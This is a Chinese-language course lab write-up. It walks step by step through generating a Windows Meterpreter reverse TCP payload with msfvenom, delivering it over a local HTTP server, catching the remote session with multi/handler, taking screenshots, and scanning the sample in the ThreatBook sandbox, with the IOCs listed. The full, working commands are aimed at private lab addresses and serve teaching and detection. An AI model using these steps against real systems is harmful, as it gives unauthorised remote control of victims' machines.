# PPT9-10 作业一：Windows 被控端控制与微步云沙箱检测

> **安全声明**：本项目为网络安全课程实验记录，所有操作均在本地隔离的 VMware 虚拟机靶场中完成，仅用于教学、防守检测与安全研究，不针对任何真实网站或未授权系统。仓库中不包含木马可执行文件。

## 1. 项目介绍

本实验使用 Metasploit Framework 的 `msfvenom` 生成 Windows 平台的 Meterpreter 反向 TCP 载荷，通过 `exploit/multi/handler` 接收反弹会话，从而在 Kali 攻击机上远程控制 Windows 被控端。随后将生成的样本提交至微步云沙箱（ThreatBook）进行检测，并记录检测结果与 IOC。

## 2. 实验环境

| 角色 | 操作系统 | IP 地址 | 主要工具 |
| --- | --- | --- | --- |
| 攻击机 | Kali Linux | `192.168.88.128` | Metasploit Framework、msfvenom、Python HTTP Server |
| 被控端 | Windows 11 24H2 | `192.168.88.130` | PowerShell、Microsoft Edge |
| 虚拟化平台 | VMware Workstation | - | 仅主机/NAT 隔离实验网络 |
| 沙箱平台 | 微步云沙箱 | `https://s.threatbook.com/` | 样本静态/动态分析 |

> 课程 PPT 中示例 IP 为 `192.168.2.123`，本次实际实验环境使用 Kali 的真实地址 `192.168.88.128`。

## 3. 实验目标

1. 使用 `msfvenom` 生成 Windows Meterpreter 反向 TCP 样本。
2. 在 Kali 上启动 `multi/handler` 监听。
3. 将样本传输到 Windows 被控端并执行，获取 Meterpreter 会话。
4. 使用 `sysinfo`、`screenshot` 等命令验证远程控制。
5. 将生成的样本提交至微步云沙箱并记录检测结果。

## 4. 实验步骤

### 4.1 网络连通性验证

Kali 查看本机地址：

```bash
ip a
```

Windows 被控端验证与 Kali 的连通性：

```powershell
ipconfig
ping 192.168.88.128
```

实验网段为 `192.168.88.0/24`，Windows 能正常 `ping` 通 Kali。

### 4.2 生成 Meterpreter 载荷

在 Kali 上执行：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.128 LPORT=5000 -f exe -o /home/kali/payload.exe
```

输出确认：

```text
Payload size: 355 bytes
Final size of exe file: 7168 bytes
Saved as: /home/kali/payload.exe
```

> 说明：首次尝试保存到 `/root/payload.exe` 时因普通用户权限不足报 `Permission denied`，后将输出路径改为 `/home/kali/payload.exe` 成功。

### 4.3 启动监听端

在 Kali 启动 Metasploit：

```bash
msfconsole -q
```

在 `msf >` 提示符下执行：

```text
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.88.128
set LPORT 5000
exploit
```

监听成功：

```text
Started reverse TCP handler on 192.168.88.128:5000
```

### 4.4 向 Windows 传输并执行样本

在 Kali 的 `/home/kali` 目录启动临时 HTTP 文件服务：

```bash
cd /home/kali
python3 -m http.server 8000
```

在 Windows PowerShell 中下载：

```powershell
cd $env:USERPROFILE\Desktop
Invoke-WebRequest http://192.168.88.128:8000/payload.exe -OutFile payload.exe
dir payload.exe
```

下载结果：

```text
Length  Name
------  ----
7168    payload.exe
```

在 Windows 上执行样本：

```powershell
.\payload.exe
```

### 4.5 获取 Meterpreter 会话

Kali 的 msf 窗口出现：

```text
Sending stage (203454 bytes) to 192.168.88.130
Meterpreter session 1 opened (192.168.88.128:5000 -> 192.168.88.130:52541)
```

进入会话后执行：

```text
sysinfo
```

输出显示被控端为：

```text
Computer        : DESKTOP-9MLPPOB
OS              : Windows 11 24H2+ (10.0 Build 26200)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

使用截图命令验证远程桌面控制：

```text
screenshot
```

输出：

```text
Screenshot saved to: /home/kali/uUEHplpB.jpeg
```

### 4.6 提交微步云沙箱

将 `payload.exe` 上传至：

```text
https://s.threatbook.com/
```

分析环境选择：

- 文件类型：Windows 可执行文件 `*.exe`
- 分析环境：`Windows 10 64bit`
- 办公环境：`Office 2016/WPS 11.8`

沙箱报告结果：

```text
文件大小：7 KB
文件类型：PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections
引擎检出：11 / 28
威胁分类：木马
木马家族：Agent
```

报告链接：

```text
https://s.threatbook.com/report/file/860d9b8dee933b6557b7315ea2cbd61f34a2ad5f76f1f41578bed25966cdde58
```

## 5. 样本与 IOC

| 项目 | 值 |
| --- | --- |
| 文件名 | `payload.exe` |
| 文件大小 | 7168 字节（7 KB） |
| SHA256 | `860d9b8dee933b6557b7315ea2cbd61f34a2ad5f76f1f41578bed25966cdde58` |
| SHA1 | `689ef8700b0c3cb4ba15f3eebd692f8cf3eb3c93` |
| MD5 | `928b5435a6c005afb644ddefb2f737c3` |
| 监听地址 | `192.168.88.128:5000` |
| 回连协议 | `windows/meterpreter/reverse_tcp` |

> IOC 仅用于教学环境中的检测规则编写与实验复盘，请勿用于非法用途。

## 6. 实验结果截图

### 6.1 作业要求

![作业要求](images/00_assignment_requirements.png)

### 6.2 课程 PPT 中的 msfvenom 与 handler 示例

![课程 PPT 示例](images/01_ppt_msfvenom_handler.png)

### 6.3 Kali 环境与 msfvenom 检查

![Kali 环境检查](images/02_kali_env_check.png)

### 6.4 Windows 与 Kali 网络连通性

![Windows ping Kali](images/03_windows_ping_kali.png)

### 6.5 生成 payload

![生成 payload](images/04_payload_generated.png)

### 6.6 启动反向监听

![启动监听](images/05_handler_started.png)

### 6.7 Kali 开启 HTTP 文件服务

![HTTP 文件服务](images/06_http_file_server.png)

### 6.8 Windows 下载 payload

![Windows 下载 payload](images/07_payload_downloaded.png)

### 6.9 Meterpreter 会话建立

![Meterpreter 会话](images/08_session_opened.png)

### 6.10 sysinfo 验证被控端信息

![sysinfo](images/09_sysinfo.png)

### 6.11 远程截图验证

![远程截图](images/10_screenshot_saved.png)

### 6.12 微步云沙箱检测报告

![微步云沙箱报告](images/11_sandbox_report.png)

## 7. 实验总结

- 成功使用 `msfvenom` 生成 Windows Meterpreter 反向 TCP 样本。
- 成功通过 `multi/handler` 接收反弹会话并控制 Windows 11 靶机。
- `sysinfo` 与 `screenshot` 验证了远程控制能力。
- 样本在微步云沙箱中被判定为恶意，检出率为 `11/28`，家族为 `Agent`。
- 通过本实验理解了反弹 Shell 的基本流程，以及沙箱静态/动态检测在恶意样本分析中的作用。

## 8. 免责声明

本仓库内容仅用于网络安全课程实验、靶场练习和防御研究。请勿将相关技术用于未经授权的系统访问、恶意控制或任何违法用途。实验环境应与互联网及生产网络隔离。
